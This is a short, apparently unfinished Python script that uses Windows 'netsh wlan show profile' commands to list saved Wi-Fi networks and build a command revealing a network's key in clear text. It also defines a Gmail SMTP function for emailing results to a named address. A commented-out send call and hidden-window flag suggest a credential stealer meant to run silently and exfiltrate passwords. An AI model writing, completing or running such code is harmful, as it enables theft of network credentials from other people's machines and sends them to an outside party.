import subprocess, smtplib, re

def sendmail(email, password, message):
	server = smtplib.SMTP("smtp.gmail.com", 587)
	server.starttls()
	server.login(email, password)
	server.sendmail(email, email, message)
	server.quit()




#CREATE_NO_WINDOW = 0x08000000
#if __name__ == "__main__":

	# startupinfo=si)
command = "netsh wlan show profile"
result = subprocess.check_output(command, shell=True)
network_name_list = re.findall("(?:Profile\s*:\s)(.*)", result.decode())
print(network_name_list)
result = ""
command = "netsh wlan show profile name=" + network_name_list[0] + " key=clear"
print(command)

#sendmail("sharma.rishix02@gmail.com", "", result)
